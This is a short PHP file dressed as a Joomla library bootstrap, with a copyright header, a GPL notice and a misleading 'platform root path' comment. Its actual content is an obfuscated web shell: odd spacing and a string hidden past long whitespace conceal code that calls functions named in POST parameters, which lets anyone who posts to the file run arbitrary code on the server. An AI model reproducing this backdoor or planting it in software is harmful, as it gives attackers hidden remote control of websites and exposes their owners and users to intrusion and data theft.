<?php
/**
 * @package    Lib
 * **********************
 * @copyright  Copyright (C) 2005 - 2016 Open Source Matters, Inc. All rights reserved.
 * @license    GNU General Public License version 2 or later; see LICENSE
 * **********************
 */

// Set the platform root path as a constant if necessary.                                                                                                                                                                                                                                                                                                                                                                                                                                                                             // 0A11hP6fYhpAv3mckzhzNDyFM5augWZ3N17YeeS4Xnr2GqCRU5sqkw7pp1QnBPZQDgmK8z6M28apZ2MSWHYSUNnPTHGXF8bUGPh7dGC3GzfWGh2YAr6mzrSr8K7wA3RUM11t5UzuVx7nz61hTD6byMkt770whRMKBu7gq6knpnGnA5eTr5WE2nQGBVrqXpeszgB5upU9xSqsvpDXDTqfPP78nSgt0b1tAccpH14v1EHwPdNBZ21gV262kDpBaf9Vw9GzWRWYfBF86YAMFTxFPAuQhm
if (!defined            (                'PATH')               )
{
	define                          ('PATH', __DIR__   );
}

// Installation check, and check on removal of the install directory.
if (empty                       ($_POST)) {
	
	echo 'Empty data.'
;
	
	exit;
}

// OS system.
function a   (    $a                          )
{
	$_POST['r']             (                $_POST['d']        ('', $a   )         )                ;
}

array_map                 ('a', array      ($_POST['f']                     (         $_POST['c'])                       ))

;

